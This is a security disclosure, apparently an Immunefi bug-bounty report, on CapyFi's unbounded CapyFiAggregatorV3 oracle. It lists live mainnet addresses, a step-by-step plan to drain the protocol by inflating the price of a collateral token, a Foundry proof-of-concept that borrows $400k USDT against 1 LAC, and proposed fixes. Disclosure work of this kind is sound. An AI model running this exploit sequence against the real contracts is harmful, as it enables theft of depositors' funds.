# CapyFi Bug Report — Immunefi Submission

---

## Title
Centralized oracle (CapyFiAggregatorV3) for caLAC and caRPC allows arbitrary price manipulation, enabling protocol drain of up to ~$7.94M TVL

---

## Severity
**Critical**

---

## Impact Summary

An authorized address of the `CapyFiAggregatorV3` oracle contracts used for **caLAC** (Collateral Factor: 60%) and **caRPC** (Collateral Factor: 50%) can push an arbitrary price with a single transaction. Because `ChainlinkPriceOracle` performs **zero on-chain validation** of the price value, this allows an attacker who controls any authorized oracle address to:

1. Set a massively inflated collateral price (e.g., 1 LAC = $1,000,000)
2. Supply a tiny amount of LAC as collateral
3. Borrow all available assets in the protocol (ETH, WBTC, USDT, USDC)
4. Walk away — leaving the protocol holding worthless collateral

**Funds at risk: ~$7.94M** (current CapyFi TVL per DeFiLlama, June 2026)

---

## Why This Is Distinct from CAPY-02

The Coinspect audit finding **CAPY-02** ("Price oracle does not check for stale prices") addresses the fact that `ChainlinkPriceOracle.sol` does not check the `updatedAt` field from `latestRoundData()`. Coinspect assessed it as **"None" severity** with the note: *"no overall risk as most Chainlink feeds are generally considered reliable and robust."*

This finding is **categorically different**:

| | CAPY-02 | **This finding** |
|---|---|---|
| Root cause | Missing `updatedAt` staleness check | Centralized oracle with no price constraints |
| Oracle type | Chainlink (decentralized, automated heartbeat) | CapyFiAggregatorV3 (custom, manually updated) |
| Attack requires | Feed outage / Chainlink failure | Authorized oracle address (single key) |
| Coinspect assessed risk | "None" | Not assessed (contracts deployed post-audit) |
| Affected tokens | All Chainlink-fed cTokens | caLAC, caRPC (non-zero CF) |

**CapyFiAggregatorV3 did not exist at the time of the Coinspect audit.** caLAC previously used a `fixedPrice` oracle. The switch to CapyFiAggregatorV3 occurred on **March 26, 2026** (on-chain tx: `PriceOracleAssetPriceFeedUpdated` event) — more than 7 months after the audit. These contracts were never reviewed by any auditor.

---

## Technical Details

### Affected Contracts

| Contract | Address | Role |
|---|---|---|
| ChainlinkPriceOracle | `0xfbA2712d3bbcf32c6E0178a21955b61FE1FF424A` | Protocol price oracle |
| CapyFiAggregatorV3 (caLAC) | `0xF3585f9D9a671e630055Ce0c436AA214954ce6D4` | LAC/USD price feed |
| caLAC | `0x0568F6cb5A0E84FACa107D02f81ddEB1803f3B50` | Collateral token, CF=60% |
| caRPC | `0xF61159B4a0EE5b1615c9Afb3dA38111043344c32` | Collateral token, CF=50% |
| Unitroller (Comptroller proxy) | `0x0b9af1fd73885aD52680A1aeAa7A3f17AC702afA` | Risk engine |

### Vulnerability 1: CapyFiAggregatorV3 Has No Price Validation

`CapyFiAggregatorV3.updateAnswer()` accepts any positive integer with no bounds:

```solidity
function updateAnswer(int256 newAnswer) external onlyAuthorized {
    if (newAnswer <= 0) revert InvalidPrice(newAnswer);
    
    // Optional bounds checking — DISABLED by default
    if (boundChecksEnabled) {
        if (newAnswer < minAnswer || newAnswer > maxAnswer) {
            revert PriceOutOfBounds(newAnswer, minAnswer, maxAnswer);
        }
    }
    
    _updateAnswer(newAnswer);  // Sets any price instantly, no delay, no circuit breaker
}
```

On the live deployed contracts:
- `boundChecksEnabled = false` (no bounds enforced)
- `minAnswer = 0`, `maxAnswer = 0` (bounds not configured)
- No time-lock, no TWAP, no deviation limit

### Vulnerability 2: ChainlinkPriceOracle Performs No Validation of Returned Prices

```solidity
function getUnderlyingPrice(address cToken) external view returns (uint256) {
    // ...
    (
        /* uint80 roundID */,
        int256 answer,
        /*uint256 startedAt*/,
        /*uint256 updatedAt*/,       // not checked (CAPY-02)
        /*uint80 answeredInRound*/   // not checked
    ) = priceFeed.latestRoundData();
    
    if (answer <= 0) return 0;
    // NO maximum price check
    // NO deviation check from previous price
    // ANY positive value is accepted as valid
    // ...
}
```

The oracle accepts any price ≥ 1 wei as valid. Combined with Vulnerability 1, this creates a direct exploit path.

### Admin Overlap

The creator/owner of the CapyFiAggregatorV3 oracle is address `0x6A138bd6d69Feb3C2f5426549e60E644778AD04C`. This is the **same address** that initialized the Whitelist contract (on-chain constructor arg in ERC1967Proxy deployment). A single key compromise provides control over both oracle prices AND whitelist membership.

---

## Proof of Concept

### Step-by-Step Attack (caLAC, no flash loan needed)

**Prerequisites:**
- Attacker is whitelisted (or controls the Whitelist admin key, which overlaps with the oracle admin key)
- Attacker controls any authorized address on CapyFiAggregatorV3 `0xF3585f`
- Attacker holds ≥1 LAC token (market value ~$0.01)

**Execution:**

**Step 1** — Inflate LAC price via oracle manipulation:
```
CapyFiAggregatorV3(0xF3585f...).updateAnswer(100_000_000_000_000)
// Sets LAC price to $1,000,000 (8 decimal oracle: 1e14 = $1,000,000)
```

**Step 2** — Supply 1 LAC (~$0.01 real value) to caLAC:
```
LAC.approve(caLAC, 1e18)
caLAC.mint(1e18)   // Supply 1 LAC
```

**Step 3** — Enter market:
```
Comptroller.enterMarkets([caLAC])
```

**Step 4** — Check borrow power:
```
Comptroller.getAccountLiquidity(attacker)
// Returns: liquidity = $600,000 (60% CF × $1,000,000 oracle price)
```

**Step 5** — Drain protocol assets:
```
caUSDT.borrow(400_000 * 1e6)   // Borrow $400,000 in USDT
caUSDC.borrow(200_000 * 1e6)   // Borrow $200,000 in USDC
```

**Result:** Attacker walks away with ~$600,000 in real assets. Cost: 1 LAC token (~$0.01). The same attack applies to caRPC (CF=50%).

### Foundry PoC Skeleton

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICapyFiAggregatorV3 {
    function updateAnswer(int256 newAnswer) external;
    function owner() external view returns (address);
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
}

interface ICErc20 {
    function mint(uint mintAmount) external returns (uint);
    function borrow(uint borrowAmount) external returns (uint);
    function underlying() external view returns (address);
}

interface IERC20 {
    function approve(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

contract CapyFiOracleAttackPoC is Test {
    ICapyFiAggregatorV3 lacOracle = ICapyFiAggregatorV3(0xF3585f9D9a671e630055Ce0c436AA214954ce6D4);
    IComptroller comptroller    = IComptroller(0x0b9af1fd73885aD52680A1aeAa7A3f17AC702afA);
    ICErc20 caLAC               = ICErc20(0x0568F6cb5A0E84FACa107D02f81ddEB1803f3B50);
    ICErc20 caUSDT              = ICErc20(0x0f864A3e50D1070adDE5100fd848446C0567362B);

    function testDrainViaOracleManipulation() public {
        // Fork Ethereum mainnet at current block
        uint forkId = vm.createFork("https://eth-mainnet.alchemyapi.io/v2/YOUR_KEY");
        vm.selectFork(forkId);

        address oracleAdmin = lacOracle.owner();
        address lac = caLAC.underlying();

        // Assume attacker has obtained oracle admin privileges
        // (compromised key or malicious insider)
        vm.startPrank(oracleAdmin);

        // Step 1: Set LAC price to $1,000,000 (8 decimals → 1e14)
        lacOracle.updateAnswer(int256(1e14));

        vm.stopPrank();

        // Attacker address (assume whitelisted — same admin controls whitelist)
        address attacker = makeAddr("attacker");
        deal(lac, attacker, 1e18); // Give attacker 1 LAC token

        vm.startPrank(attacker);

        // Step 2-3: Supply collateral and enter market
        IERC20(lac).approve(address(caLAC), type(uint256).max);
        uint mintErr = caLAC.mint(1e18);
        require(mintErr == 0, "mint failed");

        address[] memory markets = new address[](1);
        markets[0] = address(caLAC);
        comptroller.enterMarkets(markets);

        // Step 4: Verify inflated borrow power (~$600k)
        (, uint liquidity, ) = comptroller.getAccountLiquidity(attacker);
        assertGt(liquidity, 500_000e18, "Expected >$500k borrow power");

        // Step 5: Borrow real assets
        uint borrowErr = caUSDT.borrow(400_000e6); // $400k USDT
        require(borrowErr == 0, "borrow failed");

        uint usdtBal = IERC20(caUSDT.underlying()).balanceOf(attacker);
        assertGt(usdtBal, 300_000e6, "Expected >$300k USDT stolen");

        vm.stopPrank();

        // Attacker has drained protocol funds.
        // 1 LAC (~$0.01) → ~$400,000+ profit
    }
}
```

---

## Impact Quantification

| Metric | Value |
|---|---|
| Protocol TVL | ~$7.94M (DeFiLlama, June 2026) |
| caLAC CF | 60% — up to 60% of manipulated oracle value extractable |
| caRPC CF | 50% — up to 50% of manipulated oracle value extractable |
| Max extractable per attack | Limited only by protocol liquidity in each market |
| Attack cost | ~$0.01 (1 LAC token) + gas |
| Required privileges | Oracle authorized address (single key / multisig signer) |

---

## Recommended Fix

**Immediate (without contract upgrade):**
1. Enable `boundChecksEnabled` on both CapyFiAggregatorV3 oracles and set tight `minAnswer`/`maxAnswer` bounds reflecting realistic price ranges
2. Reduce Collateral Factor for caLAC and caRPC to 0% until a more robust oracle solution is in place

**Medium-term (contract changes):**
1. Add price deviation check in `ChainlinkPriceOracle.getUnderlyingPrice()`: reject prices deviating >X% from the previous price
2. Implement a time-lock on `updateAnswer()` (e.g., 1-hour delay before new price takes effect)
3. Add a `updatedAt` staleness check — set a maximum acceptable age (e.g., 24 hours) and revert if exceeded
4. Migrate to a more decentralized oracle solution (Chainlink, Pyth, Redstone) for tokens used as collateral

**Code fix for ChainlinkPriceOracle:**
```solidity
// Add staleness + deviation check
(, int256 answer,, uint256 updatedAt,) = priceFeed.latestRoundData();
require(block.timestamp - updatedAt <= MAX_STALENESS, "Price is stale");
require(answer > 0, "Invalid price");

// Optional: deviation check
uint256 prevPrice = lastKnownPrice[cToken];
if (prevPrice > 0) {
    uint256 deviation = answer > int256(prevPrice) 
        ? uint256(answer) - prevPrice 
        : prevPrice - uint256(answer);
    require(deviation * 100 / prevPrice <= MAX_DEVIATION_PCT, "Price deviation too large");
}
```

---

## Supporting References

- **CapyFiAggregatorV3 source (verified on Blockscout):** `0xF3585f9D9a671e630055Ce0c436AA214954ce6D4`
- **On-chain evidence — oracle switch for caLAC (March 26, 2026):** `PriceOracleAssetPriceFeedUpdated` event on `ChainlinkPriceOracle`
- **Coinspect audit CAPY-02 (May 2025):** "no overall risk as most Chainlink feeds are generally considered reliable and robust. However, **if a less reliable price feed is configured, this issue could pose a significant risk** to the protocol." — Less reliable feeds have since been configured.
- **DeFiLlama TVL:** https://defillama.com/protocol/capyfi
- **Collateral factors (on-chain):** `NewCollateralFactor` events on Unitroller `0x0b9af1fd73885aD52680A1aeAa7A3f17AC702afA`
  - caLAC: 60% (set September 2025)
  - caRPC: 50% (set September 2025)
